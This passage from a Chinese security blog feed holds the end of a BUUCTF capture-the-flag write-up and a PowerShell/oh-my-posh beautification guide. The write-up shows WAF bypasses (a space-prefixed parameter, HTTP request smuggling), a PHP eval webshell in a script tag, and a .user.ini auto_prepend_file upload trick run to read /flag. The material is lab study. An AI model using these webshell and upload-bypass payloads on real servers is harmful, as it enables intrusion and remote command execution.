class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来我以为calc.php中的过滤即为waf，但是及时我们输入符合过滤规则题目也会触发报错，应该是加了waf，那么我们的请求的流程就是<code>提交请求-&gt;waf过滤-&gt;calc.php中再次过滤并执行</code>，这样的话按照上面的思路，我们可以在字段<code>num</code>前面加个空格，waf不会过滤该字段(因为该字段为<code>num</code>)，在PHP后端又会解析为<code>num</code>，这样就绕过了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:27779&#x2F;calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>查看禁用函数</p><p><img src="/2020/04/02/buuctf/13.png" alt></p><p>发现命令执行的函数被禁用了，那么我们可以使用<code>scandir</code>函数来获得目录，用<code>file_get_contents</code>来读文件，因为引号被过滤了，所以我们用asicc码来构造文件名</p><p><img src="/2020/04/02/buuctf/14.png" alt></p><p><img src="/2020/04/02/buuctf/15.png" alt></p><p>PS: 通过查看题目waf过滤规则可以看到题目过滤的仅仅是参数<code>num</code>，如果被拦截则会返回403</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecRule ARGS:num &quot;@rx [a-zA-Z_\x7f-\xff\x00-\x24][a-zA-Z_0-9\x7f-\xff\x00-\x24]*&quot; &quot;id:001,msg:&#39;Hack&#39;,severity:ERROR,deny,status:403&quot;</span><br></pre></td></tr></table></figure><hr><p>此题目还有另一种方法可以绕过，就是利用HTTP走私攻击<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a>，当请求包含两个<code>Content-Length</code>时可以实现HTTP走私</p><p><img src="/2020/04/02/buuctf/16.png" alt></p><p>因为waf服务器看到请求头中有两个content-length会返回400错误，但是后端却依然会处理该请求</p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>题目简化了一下,直接给出了源码，核心部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your dir "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your files : &lt;br&gt;'</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤有三个：</p><blockquote><ol><li>文件名中不得出现<code>ph</code>或<code>htacess</code></li><li>文件内容不得以<code>&lt;?</code>开头</li><li>exif_imagetype()函数校验图片</li></ol></blockquote><p>依次绕过：</p><blockquote><ol><li>上传文件后缀修改为jpg</li><li>用标签<code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_REQUEST[&#39;snow&#39;]);&lt;/script&gt;</code>来包裹PHP语句</li><li>添加文件头</li></ol></blockquote><p>接下来就是设法将jpg文件解析为PHP文件从而getshell，通过<code>.user.ini</code>文件可以实现该功能，在PHP官方文档中有详细的解释</p><p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener"></a></p><p><img src="/2020/04/02/buuctf/17.png" alt></p><p>PHP启动时会在每个目录下扫描.user.ini文件，从被执行的PHP文件目录开始一直上升到web根目录。如果被执行的PHP文件在web根目录之外，则只扫描该目录。需要注意的是<strong>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</strong><a href="https://www.php.net/manual/en/ini.list.php" target="_blank" rel="noopener">https://www.php.net/manual/en/ini.list.php</a>可以查询配置名和设置模式，其中，有两个设置项很关键</p><blockquote><p><strong>auto_prepend_file</strong>: 指定在加载主文件之前解析的文件，相当于在主文件最前面加一个<code>require</code>语句<br><strong>auto_append_file</strong>： 与上面类似，只不过是在主文件结束之后解析</p></blockquote><p>所以攻击思路就是先上传一个.user.ini文件，指定要包含的jpg文件；然后上传jpg文件getshell</p><p>上传<code>.user.ini</code>文件</p><p><img src="/2020/04/02/buuctf/18.png" alt></p><p><code>#difine ...</code> 是为了绕过exif_imagetype()函数</p><p>然后上传<code>exp.jpg</code></p><p><img src="/2020/04/02/buuctf/19.png" alt></p><p>然后即可getflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ec4f3f55-24f4-49f2-84e5-58b3b5f49a95.node3.buuoj.cn&#x2F;uploads&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;index.php?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/02/buuctf/20.png" alt></p><blockquote><p>这个漏洞感觉实际利用可能性不大，因为不大可能会有奇葩程序员会在保存上传文件的文件夹下放一个可执行的PHP文件</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>oh-my-posh美化PowerShell</title>
    <link href="http://chaosec.top/2020/03/22/psbeautify/"/>
    <id>http://chaosec.top/2020/03/22/psbeautify/</id>
    <published>2020-03-22T06:29:44.000Z</published>
    <updated>2020-09-13T10:13:45.177Z</updated>
    
    <content type="html"><![CDATA[<p>爱美之心，人皆有之</p><a id="more"></a><p>Windows下的shell真的是丑出天际，字体也非常别扭，之前用的cmder，刚开始相比cmd的话，确实是美观多了，不过使用了一段时间之后又觉得很丑了，而且cmder实现原理在于把一些常用的linux命令在windows下编译为可执行文件，这样就导致一定的命令延迟，这让我觉得莫名的别扭（好吧，我就是审美奇葩），在加上最近准备把powershell作为主力shell，而默认的PowerShell比CMD还要感人，需要进行一下美化</p><p>oh-my-posh是windows下的主题工具，借鉴于linux下的oh-my-zsh，我此次就是利用该工具来美化PS</p><h1 id="安装包管理器"><a href="#安装包管理器" class="headerlink" title="安装包管理器"></a>安装包管理器</h1><p><code>scoop</code>是Windows下一款非常好用的包管理工具，能够自动设置环境变量，类似于linux下的apt等包管理工具，官网<a href="https://scoop.sh/" target="_blank" rel="noopener">Click Here</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser # 设置powershell执行策略</span><br><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;get.scoop.sh&#39;) # 安装scoop</span><br></pre></td></tr></table></figure><p>安装完成后，输入<code>scoop</code>，如下所示即说明安装成功</p><p><img src="/2020/03/22/psbeautify/1.png" alt></p><p>安装git与posh-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scoop install -g git</span><br><span class="line">scoop bucket add extras</span><br><span class="line">scoop install posh-git</span><br></pre></td></tr></table></figure><p>安装oh-my-posh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install oh-my-posh</span><br></pre></td></tr></table></figure><p>安装过程中如果出现超时错误的话请扶墙</p><h1 id="安装字体"><a href="#安装字体" class="headerlink" title="安装字体"></a>安装字体</h1><p>中文环境下，默认的ps字体不仅不美观，而且很多特殊字符也不支持，这会导致后面修改主题时看不到效果，出现乱码，而powershell的字体要求非常高，一般的字体无法在原生的ps终端使用，根据其它大佬的测试，<code>Sarasa Gothic</code>字体是符合ps的苛刻要求的，<a href="https://github.com/be5invis/Sarasa-Gothic/releases" target="_blank" rel="noopener">Github地址</a></p><p><strong>安装powerline字体</strong></p><p>除了上述字体之外，还可以安装powerline系列字体，能够很好的适配，Github地址<a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">在这</a><br>下载之后选择自己喜欢的字体安装，也可以运行<code>install.ps1</code>全部安装</p><h1 id="启用oh-my-posh"><a href="#启用oh-my-posh" class="headerlink" title="启用oh-my-posh"></a>启用oh-my-posh</h1><p>接下来需要编写配置文件，才能够让配置每次自动生效，配置路径在<code>$profile</code>中，我们可以输入该变量查看配置文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ $profile</span><br><span class="line">C:\Users\Snow\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure><p>配置文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module DirColors</span><br><span class="line">Import-Module Posh-git</span><br><span class="line">Import-Module oh-my-posh</span><br></pre></td></tr></table></figure><p><code>DirColors</code>是一个对输出进行着色的模块</p><p><strong>配置主题：</strong><br>oh-my-posh内置多个主题，使用<code>Set-Theme</code>命令可以预览主题，TAB键可以切换不同的主题，我个人比较喜欢<code>Honukai</code>主题<br>在修改主题后，需要将改动写入配置文件<code>$profile</code>中，否则下次启动就还是原主题，在配置文件中加一行内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Theme Honukai</span><br></pre></td></tr></table></figure><p><strong>修改配置：</strong></p><p>输入<code>$ThemeSettings</code>可以查看当前设置</p><p>修改用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ThemeSettings.CurrentUser &#x3D; &#39;aesm1p&#39;</span><br></pre></td></tr></table></figure><p>如果想要永久生效需要将上述命令写入配置文件<code>$profile</code></p><h1 id="第三方终端"><a href="#第三方终端" class="headerlink" title="第三方终端"></a>第三方终端</h1><p>在按照上述方法配置之后，PS就能够使用了。不过，虽然原生PS运行效率高，速度快，可由于PS太过底层，导致颜值控们进行美化修改时存在诸多限制，比如字体，上文提到的能在原生ps下使用的字体寥寥无几，选择空间有限，而且界面配色，背景等设置在PS中也非常困难，而通过第三方终端可以很方便的进行设置美化</p><h2 id="Windows-Terminal"><a href="#Windows-Terminal" class="headerlink" title="Windows Terminal"></a>Windows Terminal</h2><p>个人最推荐的一款，微软爸爸官方开源，维护很及时，而且字体的锯齿消除做的是最好的，而且官方应用优化也是更加的独到，缺点是目前配置主要使用json文件来配置，没有gui界面，对小白不太友好，不过WindowsTerminal有完善的官方文档指导还是很贴心的。<br>安装该软件需要windows10版本为1903以上，可以通过Microsoft Store安装，也可以在github下载安装，通过store安装的话能够自动更新，手动安装无法自动获取更新。<br>安装完成之后进入软件打开设置<code>settings.json</code>，设置文件结构为：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"theme"</span>: <span class="string">"light"</span>, <span class="comment">//主题有light,dark,system三种</span></span><br><span class="line">  <span class="attr">"profiles"</span>: <span class="comment">//配置选项</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"defaults"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//此处添加全局配置</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"list"</span>:</span><br><span class="line">    [</span><br><span class="line">      <span class="comment">//单独配置</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"schemes"</span>: <span class="comment">//配色方案，以列表形式存储</span></span><br><span class="line">  [</span><br><span class="line">    &#123;&#125;,<span class="comment">//scheme</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"keybindings"</span>:<span class="comment">//绑定快捷键，具体可修改的快捷键参数可以查阅官方文档</span></span><br><span class="line">  [</span><br><span class="line">    &#123;&#125;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>了解清楚配置文件结构之后添加相应的配置参数即可，主要是字体大小，配色方案，键绑定等，这里贴上我的配置方案<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows 终端(未打包) 1.2.200825001-release1.2</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// "defaultProfile": "&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;",</span></span><br><span class="line">    <span class="attr">"theme"</span>: <span class="string">"light"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">    <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">    <span class="attr">"copyOnSelect"</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">    <span class="attr">"copyFormatting"</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">    <span class="comment">// Each one of them will appear in the 'New Tab' dropdown,</span></span><br><span class="line">    <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">    <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">    <span class="attr">"profiles"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"defaults"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">            <span class="attr">"name"</span>:<span class="string">"PowerShell"</span>,</span><br><span class="line">            <span class="attr">"source"</span>: <span class="string">"Windows.Terminal.PowershellCore"</span>,</span><br><span class="line">            <span class="attr">"colorScheme"</span>: <span class="string">"One Half Dark"</span>,</span><br><span class="line">            <span class="attr">"cursorColor"</span>:<span class="string">"#FFFFFF"</span>,</span><br><span class="line">            <span class="attr">"fontFace"</span>:<span class="string">"Meslo LG M for Powerline"</span>,</span><br><span class="line">            <span class="attr">"fontSize"</span>:<span class="number">10</span>,</span><br><span class="line">            <span class="attr">"cursorShape"</span>:<span class="string">"filledBox"</span>,</span><br><span class="line">            <span class="attr">"startingDirectory"</span>:<span class="string">"your dir"</span>,</span><br><span class="line">            <span class="attr">"backgroundImage"</span> : <span class="string">"image path"</span>,</span><br><span class="line">            <span class="attr">"backgroundImageOpacity"</span>: <span class="number">0.3</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"list"</span>:</span><br><span class="line">        [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Windows PowerShell"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"powershell.exe"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"命令提示符"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"cmd.exe"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// &#123;</span></span><br><span class="line">            <span class="comment">//     "guid": "&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;",</span></span><br><span class="line">            <span class="comment">//     "hidden": false,</span></span><br><span class="line">            <span class="comment">//     "name": "Azure Cloud Shell",</span></span><br><span class="line">            <span class="comment">//     "source": "Windows.Terminal.Azure"</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Azure"</span>,</span><br><span class="line">                <span class="attr">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec44156&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Python InterAction"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"py"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">    <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">    <span class="attr">"schemes"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="attr">"name"</span> : <span class="string">"Frost"</span>,</span><br><span class="line">                <span class="attr">"background"</span> : <span class="string">"#FFFFFF"</span>,</span><br><span class="line">                <span class="attr">"black"</span> : <span class="string">"#3C5712"</span>,</span><br><span class="line">                <span class="attr">"blue"</span> : <span class="string">"#17b2ff"</span>,</span><br><span class="line">                <span class="attr">"brightBlack"</span> : <span class="string">"#749B36"</span>,</span><br><span class="line">                <span class="attr">"brightBlue"</span> : <span class="string">"#27B2F6"</span>,</span><br><span class="line">                <span class="attr">"brightCyan"</span> : <span class="string">"#13A8C0"</span>,</span><br><span class="line">                <span class="attr">"brightGreen"</span> : <span class="string">"#89AF50"</span>,</span><br><span class="line">                <span class="attr">"brightPurple"</span> : <span class="string">"#F2A20A"</span>,</span><br><span class="line">                <span class="attr">"brightRed"</span> : <span class="string">"#F49B36"</span>,</span><br><span class="line">                <span class="attr">"brightWhite"</span> : <span class="string">"#741274"</span>,</span><br><span class="line">                <span class="attr">"brightYellow"</span> : <span class="string">"#991070"</span>,</span><br><span class="line">                <span class="attr">"cyan"</span> : <span class="string">"#3C96A6"</span>,</span><br><span class="line">                <span class="attr">"foreground"</span> : <span class="string">"#000000"</span>,</span><br><span class="line">                <span class="attr">"green"</span> : <span class="string">"#6AAE08"</span>,</span><br><span class="line">                <span class="attr">"purple"</span> : <span class="string">"#991070"</span>,</span><br><span class="line">                <span class="attr">"red"</span> : <span class="string">"#8D0C0C"</span>,</span><br><span class="line">                <span class="attr">"white"</span> : <span class="string">"#6E386E"</span>,</span><br><span class="line">                <span class="attr">"yellow"</span> : <span class="string">"#991070"</span></span><br><span class="line">            &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom keybindings to this array.</span></span><br><span class="line">    <span class="comment">// To unbind a key combination from your defaults.json, set the command to "unbound".</span></span><br><span class="line">    <span class="comment">// To learn more about keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">    <span class="attr">"keybindings"</span>:</span><br><span class="line">    [</span><br><span class="line">        <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">        <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">        <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123;<span class="attr">"action"</span>: <span class="string">"copy"</span>, <span class="attr">"singleLine"</span>: <span class="literal">false</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"ctrl+c"</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"paste"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+v"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"find"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+shift+f"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">        <span class="comment">// - "split": "auto" makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">        <span class="comment">// - "splitMode": "duplicate" makes the new pane use the focused pane's profile.</span></span><br><span class="line">        <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123; <span class="attr">"action"</span>: <span class="string">"splitPane"</span>, <span class="attr">"split"</span>: <span class="string">"auto"</span>, <span class="attr">"splitMode"</span>: <span class="string">"duplicate"</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"alt+shift+d"</span> &#125;,</span><br><span class="line">        &#123;<span class="attr">"command"</span>: <span class="string">"closeTab"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+delete"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最终效果如下：<br><img src="/2020/03/22/psbeautify/12.png" alt></p><h2 id="Fluent-Terminal"><a href="#Fluent-Terminal" class="headerlink" title="Fluent Terminal"></a>Fluent Terminal</h2><p>我最先使用的是这款，在github上搜索，然后下载后用ps运行文件夹下的<code>Install.ps1</code>即可，效果如下：</p><p><img src="/2020/03/22/psbeautify/2.png" alt></p><p>比起PS来已经美观多了，不过吹毛求疵的我还是感觉到了一丝丝不爽：</p><ol><li>启动时有时会加载不出左侧的命令提示符，或者比较慢，需要按下回车才能出来，总之初始化有时会有点卡</li><li>字体稍微有点模糊，锯齿略明显（在字体小的情况下），而且显示效果不舒服</li><li>设置项较少，跟不上我<del>装X</del>追求完美的步伐</li><li>复制粘贴时有点问题，有时候只能整行复制，选取不到某段字符</li></ol><h2 id="ConEmu"><a href="#ConEmu" class="headerlink" title="ConEmu"></a>ConEmu</h2><p><a href="https://www.fosshub.com/ConEmu.html" target="_blank" rel="noopener">官网</a>下载安装即可</p><h3 id="界面配置"><a href="#界面配置" class="headerlink" title="界面配置"></a>界面配置</h3><p>设置默认以PS启动</p><p><img src="/2020/03/22/psbeautify/3.png" alt></p><p>设置字体</p><p><img src="/2020/03/22/psbeautify/9.png" alt></p><p>设置背景图片</p><p><img src="/2020/03/22/psbeautify/4.png" alt></p><p>设置PS为默认shell</p><p><img src="/2020/03/22/psbeautify/5.png" alt></p><h3 id="设置配色"><a href="#设置配色" class="headerlink" title="设置配色"></a>设置配色</h3><p>使用colortool来进行设置，colortool是微软出的一个powershell配色工具，支持Iterm主题</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install 